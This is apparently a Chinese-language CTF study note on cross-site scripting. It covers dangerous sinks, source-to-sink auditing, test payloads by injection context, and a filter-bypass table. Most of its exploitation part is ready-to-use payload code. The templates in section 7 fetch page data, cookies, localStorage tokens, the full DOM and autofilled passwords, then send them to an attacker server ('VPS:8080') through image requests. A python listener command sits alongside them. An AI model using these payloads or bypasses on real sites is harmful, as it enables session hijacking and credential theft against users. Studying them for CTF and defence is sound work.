---
title: XSS 跨站脚本攻击
date: 2026-08-28 14:10:00
categories:
  - Web安全
tags:
  - XSS
  - 跨站脚本
description: XSS跨站脚本攻击原理、审计路径与利用打法
disableNunjucks: true
---
## 1. 一句话本质
用户的输入被浏览器当成「代码」执行，而不是「纯文本」显示。本质是打破输入与输出的信任边界，浏览器无法区分恶意与正常脚本。

> **CTF 识别信号**：源码里出现 `bot` / `puppeteer` / `headless` / `chromium` 关键词 → 99% 考 XSS。bot 的作用就是模拟管理员访问页面，触发你的 XSS。
>
> **外带** = 让 bot 的浏览器（在 admin 会话里）主动把读到的数据，当成一个「请求」发到你自己的服务器上。
>

## 2. 代码特征（看到=有洞）
### 特征 A：后端输出到 HTML 没转义
| 危险写法 | 说明 |
| --- | --- |
| `{{ x | safe }}` | 手动关转义 |
| `{% autoescape false %}` | 整块关转义 |
| `render_template_string(f"...{u}")` | 字符串拼接模板 |
| `echo $GET['x']`（PHP） | 直接输出 |
| `<%= param %>`（JSP） | 直接输出 |
| 手拼 HTML 字符串再输出 | 无转义 |


### 特征 B：前端把数据塞进「能执行 / 能解析 HTML」的 API
+ **解析 HTML**：`innerHTML` / `outerHTML` / `document.write` / `insertAdjacentHTML` / jQuery `.html()` / Vue `v-html` / React `dangerouslySetInnerHTML`
+ **执行字符串**：`eval()` / `Function()` / `setTimeout("str")` / `setInterval("str")`
+ **跳转/加载**：`location.href=` / `location.replace()` / `window.open()` / `iframe.src=`
+ **安全对照**：`textContent` / `.text()` 

### 特征 C：三个助推漏洞
+ 无 CSP，或 `script-src 'unsafe-inline'`
+ Cookie 无 HttpOnly（XSS 可偷 session）
+ 只过滤不转义（过滤可绕过：大小写/编码/双写）

### 容易漏的 sink
+ `javascript:` 伪协议（`<a href>`、`<img src>`、`<iframe src>`）
+ `srcdoc`、`<meta http-equiv="refresh">`、`<object data>`、`<embed src>`
+ `postMessage` 的 `onmessage` 回调里直接 `innerHTML` / `eval`（payload 不进服务端日志）
+ CSS `style` 属性 / `<style>` 里的 `expression()`

## 3. 审计路径（source→sink）
1. **找 Sink（出口）**：grep `innerHTML` / `document.write` / `eval` / `|safe` / `echo $`
2. **追 Source**：数据来自 URL 参数 / 表单 / Cookie / 存储（数据库）？
3. **判定**：Source 可控（用户输入）+ Sink 未转义 → 漏洞成立

> **存储型 XSS 是跨文件污点追踪**：`输入 → [存库代码] → 数据库 → [渲染代码] → 浏览器`。  
要**同时盯写库和渲染两端**——很多项目写库时过滤了、渲染时没转义，或反之；只要一端不设防即可利用。
>

## 4. 白盒验证
+ 追数据流：确认 source 可控、sink 未转义
+ 查兜底：是否有 CSP / 全局过滤 / sanitizer
+ 确认注入点上下文（HTML 内容区 / 属性值 / script 内）→ 决定 payload 写法

## 5. 黑盒验证
① 输入 `'"><svg onload=alert(1)>`  
② 查看源码：输入出现在哪？被转义了吗？  
③ 按回显位置换 payload：

| 回显位置 | payload |
| --- | --- |
| 直接出现在 HTML 内容区 | `<img src=x onerror=alert(1)>` |
| 出现在 `value="★"` 里 | `"><img src=x onerror=alert(1)>` |
| 出现在 `<script>var x='★'</script>` | `';alert(1);//` |
| 出现在 `<a href="★">` | `javascript:alert(1)` |
| 被转义成 `&lt;` | 尝试解码绕过（编码/大小写/双写） |


④ 弹了 → 判断反射/存储 → 换成外带版

## 6. 利用与打法
| 类型 | 数据路径 | 特点 |
| --- | --- | --- |
| 反射型 | 输入→服务器→原样响应→浏览器执行 | 不存储，需受害者点链接（CTF 配 bot） |
| 存储型 | 输入→存库→渲染→浏览器 | 永久存储，bot 正常访问就被打，危害最大 |
| DOM XSS | URL 参数/hash→前端 JS→写 DOM | 不经过服务器拼接，payload 不在响应 HTML 里 |


**外带思路**：让 bot 的浏览器（admin 会话）把读到的数据发到你的 VPS：  
`触发 XSS → fetch 目标数据 → new Image().src=你的VPS → VPS 解码`

## 7. Payload 模板
### 通用外带（一步）
```html
<script>
fetch("目标URL").then(r=>r.text()).then(t=>{
  new Image().src="http://你的VPS:8080/?d="+encodeURIComponent(t);
});
</script>

```

### 通用外带（两步：先拿 ID 再读详情）
```html
<script>
fetch("列表页URL").then(r=>r.text()).then(h=>{
  let id=h.split("分隔符")[1].substring(0,ID长度);
  fetch("详情页URL"+id).then(r=>r.text()).then(t=>{
    new Image().src="http://VPS:8080/?d="+encodeURIComponent(t);
  });
});
</script>

```

### 遍历多个 ID
```html
<script>
t.split("分隔符").slice(1).forEach(p=>{
  let id=p.substring(0,40);
  fetch("详情页URL"+id).then(r=>r.text()).then(t=>{
    new Image().src="http://VPS:8080/?d="+encodeURIComponent(t);
  });
});
</script>

```

### 读什么数据的变体
| 目标 | 代码 |
| --- | --- |
| 页面文本 | `fetch(url).then(r=>r.text())` |
| JSON 接口 | `fetch(url).then(r=>r.text())`（text 够用） |
| Cookie | `new Image().src="http://VPS:8080/?d="+encodeURIComponent(document.cookie)` |
| localStorage | `...encodeURIComponent(localStorage.getItem("token"))` |
| 整份 DOM | `...encodeURIComponent(document.documentElement.outerHTML)` |
| 自动填充密码 | `...document.querySelector("input[type=password]").value` |
| 当前页 URL | `...location.href` |


### 注入点特殊情况
| 情况 | 约束 | 对策 |
| --- | --- | --- |
| A：二次转义（repr/JSON） | 禁单引号、禁反斜杠 | payload 全用双引号；用 `h.split("/s/")[1]` 不用正则 |
| B：HTML 属性里 | 不能有 `"`（会闭合属性） | 用 `&#39;/&quot;` 或反引号，payload 用 `'...'` |
| C：`<script>` 标签内 | 防 `</script>` 提前闭合 | `</script><script>fetch(...)</script>` |


### 服务器监听
```bash
python3 -m http.server 8080
```

## 8. 绕过
| 被过滤的东西 | 绕过 |
| --- | --- |
| 空格（属性分隔） | `<script>alert(1)</script>`（标签内直接写 JS）；`<svg onload>`、`<details open ontoggle>` |
| 点号（属性访问） | `fetch("/")["then"](function(r){return r["text"]()})` |
| 单引号 | 改用双引号 `fetch("/")` |
| URL 中的点号 | 十六进制 IP：`http://192.168.1.100` → `http://0xc0a80164` |
| return 后需要空格 | `return(fetch("/"))`；箭头函数 `r=>r["text"]()` |
| 标签被过滤 | 换标签/事件：`<svg onload>`、`<img src=x onerror>`、`<details open ontoggle>` |
| 大小写过滤 | `<ScRiPt>`、`JaVaScRiPt:` |
| `javascript:` 被滤 | `java\nscript:`、HTML 实体 `&#106;avascript:` |
| 关键字被滤 | 字符串拼接 `alert`、`top['alert'](1)`、`window['al'+'ert']` |
| `alert` 被滤 | `confirm(1)`、`prompt(1)`、`print()` |
